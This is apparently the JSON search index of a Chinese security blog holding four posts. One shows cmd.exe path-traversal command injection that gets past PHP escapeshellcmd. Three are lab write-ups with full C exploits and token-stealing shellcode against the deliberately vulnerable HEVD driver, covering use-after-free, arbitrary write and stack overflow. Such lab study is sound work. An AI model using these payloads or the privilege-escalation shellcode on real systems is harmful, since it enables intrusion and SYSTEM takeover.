{"categories":[],"posts":[{"content":"原文：https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/\n背景 windows下外部程序执行cmd命令一般使用的是cmd.exe /c \u0026quot;command\u0026quot;,在web应用中经常会碰到应用执行命令如 ping 的情况，其调用的就是 cmd.exe /c \u0026quot;ping 127.0.0.1\u0026quot;,127.0.0.1 是外部可控参数，当参数未做过滤时即会形成命令注入，例如将参数改成 127.0.0.1|whoami\n缺陷  当可控参数无法使用 | 或 \u0026amp;符号时，命令注入在传统意义上就失去了效果，但是cmd.exe本身存在一定缺陷，用户可用通过路径遍历的方式，使cmd.exe执行任意可执行文件，即cmd.exe /c \u0026quot;ping 127.0.0.1../../../../../../../windows/system32/calc.exe\u0026quot; 调用cmd.exe /c \u0026quot;command\u0026quot;这种模式，可以通过路径遍历执行任意可执行文件，同时commad里调用命令的参数可以是混乱的，即cmd.exe /c \u0026quot;ping 1 2 3 4 5 6 7 127.0.0.1../../../../../../../windows/system32/calc.exe\u0026quot;  PHP命令注入 php中有许多函数可以达到执行命令的效果，例如 exec()、shell_exec()、system()、passthru()\nphp中有两个函数专门用来防御命令注入，分别是escapeshellcmd()和escapeshellarg()\n其中escapeshellcmd()解释如下：\n利用 测试 测试代码如下：\n\u0026lt;?php if(isset($_POST['host'])) { $host = $_POST['host']; $command = escapeshellcmd(\u0026quot;ping $host\u0026quot;); echo shell_exec($command); } else { echo \u0026quot;No host specified\u0026quot;; }  正常命令注入：\n执行exe 利用缺陷后的命令注入： 执行 png 将木马后缀更改为 png，上传到网站目录下，通过此方法执行png： msf：\n带参数执行 运行目标可执行文件时，cmd.exe会将/c后的命令行的整个部分传递给遍历出来的文件，因此若该可执行文件对参数要求宽松，即读取任意参数，但会自动过滤不可用参数时，可以做到带参数命令。\n","id":0,"section":"posts","summary":"原文：https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-","tags":["tips","translation","attack"],"title":"Cmd缺陷","uri":"https://ryze-t.github.io/2021/01/cmd%E7%BC%BA%E9%99%B7/","year":"2021"},{"content":"UAF 原理 当一个内存块被释放后再次使用，常见的有三种情况：\n 内存块被释放，其对应的指针被设置为 NULL，然后再次使用，程序无影响 内存块被释放，其对应的指针没有被设置为 NULL，即会留下一个野指针，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转 内存块被释放，其对应的指针没有被设置为 NULL，即会留下一个野指针，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题  UAF 即 Use After Free，即上述三种情况的后两种。\n 悬挂指针：指针的指向内存被删除（free 后的指针即悬挂指针，但仍是一个有效指针）\n野指针：指针变量未初始化\n 代码分析 头文件 UseAfterFreeNonPagedPool.h 头文件中定义了两个结构体：\n _USE_AFTER_FREE_NON_PAGED_POOL：定义了一个回调函数，定义了一个 Buffer _FAKE_OBJECT_NON_PAGED_POOL：定义了一个Buffer，大小等于 结构体 _USE_AFTER_FREE_NON_PAGED_POOL  UseAfterFreeNonPagedPool.c AllocateUaFObjectNonPagedPool 函数实现的主要功能为：分配内存空间，大小为 USE_AFTER_FREE_NON_PAGED_POOL\nUseUaFObjectNonPagedPool 函数实现的主要功能为：调用回调函数\nFreeUaFObjectNonPagedPool 函数实现的主要功能为：释放空间，这也是 UAF 的核心，即空间释放后未将指针置空\nAllocateFakeObjectNonPagedPool 函数实现的主要功能为：开辟一块内存空间，大小为 _FAKE_OBJECT_NON_PAGED_POOL，同时完成用户态与内核态的数据交互，即将用户态 Buffer 复制到 内核态 Buffer，这也是 UAF 的利用点：\nPool 是动态分配的，也就是说即使是在 Free 后立刻申请一个 Pool，也不一定可以申请到同一块空间。但是如果申请大量的相同大小的 Pool，就很可能会使用到之前 Free 的那个 Pool，这也就是堆喷射的原理\n根据代码来看，利用链应为：\n 申请堆块 释放堆块 申请假chunk，指向shellcode 堆喷射  IDA HEVD 的 IOCTL 通过 IrpDeviceIoCtlHandler 实现：\n由图可知：\n IOCTL = 0x222013 时，程序调用 AllocateUaFObjectNonPagedPool IOCTL = 0x222017 时，程序调用 UseUaFObjectNonPagedPool IOCTL = 0x22201B 时，程序调用 FreeUaFObjectNonPagedPool IOCTl = 0x22201F 时，程序调用 AllocateFakeObjectNonPagedPool  EXP #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;Windows.h\u0026gt; typedef void(*FunctionPointer) (); typedef struct _FAKE_UAF { FunctionPointer callback; char bufffer[0x54]; }FAKE_UAF, * P_UAF; void ShellCode() { _asm { nop pushad mov eax, fs: [124h] mov eax, [eax + 0x50] mov ecx, eax mov edx, 4 find_sys_pid : mov eax, [eax + 0xb8] sub eax, 0xb8 cmp[eax + 0xb4], edx jnz find_sys_pid mov edx, [eax + 0xf8] mov[ecx + 0xf8], edx popad ret } } int main() { DWORD recvBuf; //创建句柄，与驱动通信 HANDLE hDevice = CreateFileA(\u0026quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); // 调用 AllocateUaFObject() 函数申请内存 DeviceIoControl(hDevice, 0x222013, NULL, NULL, NULL, 0, \u0026amp;recvBuf, NULL); // 调用 FreeUaFObject() 函数释放对象 DeviceIoControl(hDevice, 0x22201B, NULL, NULL, NULL, 0, \u0026amp;recvBuf, NULL); // 申请假的 P_UAF FG_UseAfterFree = (P_UAF)malloc(sizeof(FAKE_UAF)); // 回调函数指向shellcode FG_UseAfterFree-\u0026gt;callback = ShellCode; // 堆喷射 printf(\u0026quot;Exploit......\\n\u0026quot;); for (int i = 0; i \u0026lt; 5000; i++) { DeviceIoControl(hDevice, 0x22201F, FG_UseAfterFree, 0x60, NULL, 0, \u0026amp;recvBuf, NULL); } DeviceIoControl(hDevice, 0x222017, NULL, NULL, NULL, 0, \u0026amp;recvBuf, NULL); system(\u0026quot;cmd.exe\u0026quot;); return 0; }  参考 参考 ThunderJie\n","id":1,"section":"posts","summary":"UAF 原理 当一个内存块被释放后再次使用，常见的有三种情况： 内存块被释放，其对应的指针被设置为 NULL，然后再次使用，程序无影响 内存块被释放，其对","tags":["Windows","HEVD"],"title":"HEVD UAF","uri":"https://ryze-t.github.io/2021/01/hevd-uaf/","year":"2021"},{"content":"代码分析 ArbitraryWrite.h 定义了两个指针 where、what\nArbitraryWrite.c *(Where) = *(What) 意为 Where 指向的地址所保存的值 等于 What 指向的地址所保存的值，如果可以控制两个指针就可以做到任意地址写入。\n安全代码中增加了 ProbeForRead/ProbeForWrite 函数校验，官网解释为：\n即这个函数是用来检查用户模式的 buffer 是否在地址空间的用户区，且是否对齐，其实意思就是去检查这块 buffer 是否可读/可写\nUserWriteWhatWhere = (PWRITE_WHAT_WHERE)IrpSp-\u0026gt;Parameters.DeviceIoControl.Type3InputBuffer 提供了控制两个指针的机会，通过下方也调用了 TriggerArbitraryWrite\nIDA 分析 通过 IrpDeviceIoCtlHandler 找到 ArbitraryWrite 的 IOCTL：\n跟进去查看函数 TriggerArbitraryWrite：\n和代码分析一致，漏洞点为 *v2 = *v1\n利用分析 利用过程应为：\n 通过 IOCTL 控制两个指针，where 指针指向 shellcode 地址的地址， what 指针指向shellcode地址 程序执行流执行到 where 指向的地址  所以这里需要想办法控制程序执行流\nrootkits 的分析里提到\n The first step to exploit this vulnerability is to find some address in kernel space to overwrite safely and reliably, without crashing the machine. Luckily, there’s a rarely used function in the kernel NtQueryIntervalProfile, that calls another function KeQueryIntervalProfile, which again calls HalDispatchTable+0x4.\n 即在内存空间中任意覆盖内存是很危险的，所以要找到一个安全稳定的覆盖点，这个点就是 NtQueryIntervalProfile \u0026ndash;\u0026gt; NtKeQueryIntervalProfile \u0026ndash;\u0026gt; HalDispatchTable+0x4\n在 windbg 中可以查看这个结构：\nNtQueryIntervalProfile+0x62 这个位置，81928ed6 会调用 KeQueryIntervalProfile\nKeQueryIntervalProfile+0x23这个位置，818e7438 会调用 HalDispatchTable+0x4\n当覆盖掉这个点后，调用 NtQueryIntervalProfile，程序就会执行到 shellcode 处。\n要想覆盖 HalDispatchTable+0x4 ，必须先找到 HalDispatchTable 在内核空间的准确地址，那么就需要以下几个步骤：\n 找到 ntkrnlpa.exe 在内核空间的基地址 找到 ntkrnlpa.exe 在用户空间的基地址，并计算出 HalDispatchTable+0x4 在用户空间的偏移 通过偏移计算 HalDispatchTable+0x4 在内核中的地址  这里涉及到几个函数：\n//检索每个设备驱动程序的加载位置 BOOL WINAPI EnumDeviceDrivers( LPVOID *lpImageBase, //设备驱动程序的加载地址列表的数组。 DWORD cb,\t// lpImageBase 大小 LPDWORD lpcbNeeded\t// lpImageBaes 数组中返回的字节数 );  //检索指定设备驱动程序的名称 DWORD WINAPI GetDeviceDriverBaseNameA( LPVOID ImageBase,\t//设备驱动程序的加载地址。可以使用EnumDeviceDrivers函数来检索此值。 LPSTR lpBaseName,\tDWORD nSize\t//lpBaseName缓冲区的大小 );  //加载动态库 HMODULE LoadLibrary( LPCTSTR lpFileName );  //检索指定的动态链接库(DLL)中的输出库函数地址 FARPROC GetProcAddress( HMODULE hModule, // DLL模块句柄 LPCSTR lpProcName // 函数名 );  结合起来完成上述过程的代码应为：\nLPVOID NtkrnlpaAddress() { LPVOID lpImageBase[1024]; DWORD lpcbNeeded; TCHAR lpfileName[1024]; EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), \u0026amp;lpcbNeeded); for(int i = 0; i \u0026lt; 1024; i++ ) { GetDeviceDriverBaseNameA(lpImageBase,lpfileName,100); if (!strcmp(lpfileName,\u0026quot;ntkrnlpa.exe \u0026quot;)) { return lpImageBase[i]; } } return NULL; } DWORD32 GetHalAddress_4() { PVOID pNtkrnlpaAdress = NtkrnlpaAddress(); HMODULE hUserSpaceAddress = loadlibrary(\u0026quot;ntkrnlpa.exe\u0026quot;); PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceAddress, \u0026quot;HalDispatchTable\u0026quot;); DWORD32 hal_4 = (DWORD32)pNtkrnlpaAddress + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceAddress) + 0x4; return hal_4; }  再调用一次 NtQueryIntervalProfile 即可触发shellcode\n这里需要先定义一下，查看函数原型：\nEXP 参考 Thunder J‘s EXP\n","id":2,"section":"posts","summary":"代码分析 ArbitraryWrite.h 定义了两个指针 where、what ArbitraryWrite.c *(Where) = *(What) 意为 Where 指向的地址所保存的值 等于 What 指向的地址所保存的值，如果可以控制两个指针就可以做到任意","tags":["Windows","HEVD"],"title":"HEVD 任意内存覆盖","uri":"https://ryze-t.github.io/2021/01/hevd-%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E8%A6%86%E7%9B%96/","year":"2021"},{"content":"源码分析 RtlCopyMemory 函数是一个 Windows API 函数，能将一块内存数据从一个地方复制到另一个地方。\n存在漏洞的 107 行，Size未做验证，且由 Ring3 决定，所以存在内核栈溢出。\n漏洞分析 IDA pro 打开驱动 找到 TriggerStackOverflow的方法有两种：通过 IOCTL 和 特定函数。\n通过 IOCTL： HEVD 的 IOCTL 通过 IrpDeviceIoCtlHandler 实现：\n当 eax = 0x222003h 时，程序调用 StackOverflow 模块：\n因此当 IOCTL = 0x222003h时，程序调用 StackOverflow 模块。\n通过函数： 找到内存拷贝函数 __memcpy，x 查看调用情况，找到 TriggerStackOverflow\n进入地址\n调用函数 ProbeForRead，此函数是用来判断这块内存是否为 Ring3 的内存，大小为 0x800h\n下方输出调试信息，也调用了 esi，即 KernelBuffer Size 为 0x800h：\n调用 __memcpy 的函数在模块开始处偏移 0x8F 处\n在 windbg 中调试 在 TriggerStackOverflow 开始处、调用 __memcpy 处下断点\nbu HEVD!TriggerStackOverflow bu HEVD!TriggerStackOverflow+0x8f  第0处断点： 查看寄存器：\nesp中存储的是返回地址，即 0x980f7ad4\n第1处断点： 调用 memcpy 函数\n查看寄存器：\n查看 esp ：\n调用函数前，会将参数依次 push，因此此处 esp 指向的 0x980f72b4 就是 memcpy 函数的第一个参数 KernelBuffer的地址。\n此处利用栈溢出原理：通过利用 memcpy 函数，覆盖返回地址为shellcode地址，从而调用 shellcode\n因此需要计算偏移，即 ：\nTriggerStackOverflow 返回地址（esp）- memcpy调用的第一个参数KernelBuffer（[esp]） = 0x820\n漏洞利用 根据分析所得的信息， KernelBuffer = 0x800h，KernelBuffer 到返回地址的偏移为 0x820h，因此，填充偏移 0x820为 shellcode 地址即可执行 shellcode\n尝试 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #define STACKOVERFLOW 0x222003 int main() { char buf[0x824]; DWORD bReturn = 0; HANDLE hDevice; hDevice = CreateFileA(\u0026quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026quot;, //打开的设备名称 GENERIC_READ | GENERIC_WRITE,\t// 对所打开的设备可读可写 FILE_SHARE_READ | FILE_SHARE_WRITE,\t//请求共享模式。对其属性或扩展属性的访问请求进行约束，必须与第二参数匹配 NULL, OPEN_EXISTING,\t//仅打开存在的设备 FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,\t//默认属性，允许对设备进行重叠操作 NULL ); printf(\u0026quot;Get Handle...\\n\u0026quot;); if (hDevice == NULL || hDevice == INVALID_HANDLE_VALUE)\t// 返回句柄为空或不可用 { printf(\u0026quot;Failed to get Handle...\\n\u0026quot;); return 0; } memset(buf, 'T', 0x824);\t//内存填充 0x824 个 T printf(\u0026quot;exploit...\\n\u0026quot;); DeviceIoControl(hDevice,\t//设备句柄 STACKOVERFLOW,\t//操作控制码 buf,\t//输入缓冲区的指针 0x824,\t//输入缓冲区的大小，字节数 NULL,\t//驱动程序返回给应用程序的数据缓冲区地址 0,\t//驱动程序返回给应用程序的数据缓冲区大小，字节数 \u0026amp;bReturn,\t//驱动程序实际返回给应用程序的数据字节数地址 NULL);\t//重叠操作 }  EIP 和 EBP 都被覆盖，说明此时已经覆盖了 EIP 可以控制程序执行流程。\n提权代码 windbg 下提权过程 查看进程 !dml_proc 查看进程  address 是EPROCESS（executive process block，进程执行块）的地址，记录该进程的关键信息 PID 是 进程号，system 的进程号为 4  查看 token 位置 dt命令主要用来查看相关的变量，结构体等的信息  查看 EPROCESS 类型结构，token 位于偏移 0xf8 处，结构为 _EX_FAST_REF  查看 system.exe 和 cmd.exe token： nt指内核 _EX_FAST_REF 指 token 的 结构 因为 token 在 EPROCESS 结构偏移 f8 的位置，所以查看 token 时要加 f8  system 进程 token 的值为 0x8ac01275 cmd 进程 token 的值为 0xa2087036  替换 token 以提权 ed 可以修改4字节内存值 g 可以让系统继续执行  修改后让系统继续执行并输入 whoami：\n过程的关键在于如何找到 EPROCESS。\nx86 上，FS 段寄存器用于指向 TEB（环境进程块）和 KPCR（处理器控制区），其偏移 0x124 为当前线程的 KTHREAD，KTHREAD 结构的偏移0x50处为 KPROCESS 结构，KPROCESS 结构是 EPROCESS 结构的第一个字段，因此也定位到了 EPROCESS。\n再通过 EPROCESS 偏移 0xB8 处的双向进程链表、偏移 0xB4 处的进程标识符以及System进程的进程标识符 4 遍历链表匹配到 System 进程。\n最后将 system EPROCESS 结构偏移 0xF8 处的 token 替换 当前 cmd 的 token\n汇编代码 pushad mov eax, fs:[124h]\t//将当前线程的 KTHREAD 地址存入 eax mov eax, [eax + 050h]\t//将 KPROCESS 结构首地址存入 eax mov ecx, eax\t//将 EPROCESS 结构首地址存入 ecx mov edx, 4\t//将 system pid 4 存入 edx find_sys_pid : mov eax, [eax + 0b8h]\t//将双向进程活动链表地址存入 eax sub eax, 0b8h\t//双向链表遍历 cmp[eax + 0b4h], edx\t//比较进程 pid 是否为 4 jnz find_sys_pid\t//PID != 4 时循环执行 mov edx, [eax + 0f8h]\t//将 system 进程的 token 赋给 edx mov[ecx + 0f8h], edx\t//将edx的值赋给当前线程的 token popad  此处还需要考虑一个问题，堆栈平衡。\n程序在读写数据的时候是通过地址查找的,如果函数调用之前的堆栈与函数调用之后的堆栈不一致,就可能导致找不到数据或找到的数据错误,有可能会导致程序崩溃。\n所以要使用 IDA pro，查看驱动在未进行利用时，正常的执行情况。\n在上述找到 TriggerStackOverflow 后，在 IDA pro 中输入 x 查看调用情况：\n跟进：\n程序在最后调用结束后，需要执行 pop ebp 与 ret 8\n在函数调用过程中，还会有 3 个 push\npush ebx push esi push edi  故最后的汇编应为：\npop edi pop esi pop ebx pushad mov eax, fs:[124h]\t//将当前线程的 KTHREAD 地址存入 eax mov eax, [eax + 050h]\t//将 KPROCESS 结构首地址存入 eax mov ecx, eax\t//将 KPROCESS 结构首地址存入 ecx mov edx, 4\t//将 system pid 4 存入 edx find_sys_pid : mov eax, [eax + 0b8h]\t//将双向进程活动链表地址存入 eax sub eax, 0b8h\t//双向链表遍历 cmp[eax + 0b4h], edx\t//比较进程 pid 是否为 4 jnz find_sys_pid\t//PID != 4 时循环执行 mov edx, [eax + 0f8h]\t//将 system 进程的 token 赋给 edx mov[ecx + 0f8h], edx\t//将edx的值赋给当前线程的 token popad pop ebp ret 8  EXP #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #define STACKOVERFLOW 0x222003 VOID ShellCode() { __asm { pop edi pop esi pop ebx pushad mov eax, fs:[124h] mov eax, [eax + 050h] mov ecx, eax mov edx, 4 find_sys_pid : mov eax, [eax + 0b8h] sub eax, 0b8h cmp[eax + 0b4h], edx jnz find_sys_pid mov edx, [eax + 0f8h] mov[ecx + 0f8h], edx popad pop ebp ret 8 } } int main() { char buf[0x824]; DWORD bReturn = 0; HANDLE hDevice; hDevice = CreateFileA(\u0026quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026quot;, //打开的设备名称 GENERIC_READ | GENERIC_WRITE,\t// 对所打开的设备可读可写 FILE_SHARE_READ | FILE_SHARE_WRITE,\t//请求共享模式。对其属性或扩展属性的访问请求进行约束，必须与第二参数匹配 NULL, OPEN_EXISTING,\t//仅打开存在的设备 FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,\t//默认属性，允许对设备进行重叠操作 NULL ); printf(\u0026quot;Get Handle...\\n\u0026quot;); if (hDevice == NULL || hDevice == INVALID_HANDLE_VALUE)\t// 返回句柄为空或不可用 { printf(\u0026quot;Failed to get Handle...\\n\u0026quot;); return 0; } memset(buf, 'T', 0x824);\t//内存填充 0x824 个 T *(PDWORD)(buf + 0x820) = (DWORD)\u0026amp;ShellCode; printf(\u0026quot;exploit...\\n\u0026quot;); DeviceIoControl(hDevice,\t//设备句柄 STACKOVERFLOW,\t//操作控制码 buf,\t//输入缓冲区的指针 0x824,\t//输入缓冲区的大小，字节数 NULL,\t//驱动程序返回给应用程序的数据缓冲区地址 0,\t//驱动程序返回给应用程序的数据缓冲区大小，字节数 \u0026amp;bReturn,\t//驱动程序实际返回给应用程序的数据字节数地址 NULL);\t//重叠操作 system(\u0026quot;cmd.exe\u0026quot;); return 0; }  结果 参考 参考 ThunderJie\n","id":3,"section":"posts","summary":"源码分析 RtlCopyMemory 函数是一个 Windows API 函数，能将一块内存数据从一个地方复制到另一个地方。 存在漏洞的 107 行，Size未做验证，且由 Ring3 决定，所以存在内核栈溢出。","tags":["Windows","HEVD"],"title":"HEVD 栈溢出","uri":"https://ryze-t.github.io/2021/01/hevd-%E6%A0%88%E6%BA%A2%E5%87%BA/","year":"2021"}],"tags":[{"title":"attack","uri":"https://ryze-t.github.io/tags/attack/"},{"title":"HEVD","uri":"https://ryze-t.github.io/tags/hevd/"},{"title":"tips","uri":"https://ryze-t.github.io/tags/tips/"},{"title":"translation","uri":"https://ryze-t.github.io/tags/translation/"},{"title":"Windows","uri":"https://ryze-t.github.io/tags/windows/"}]}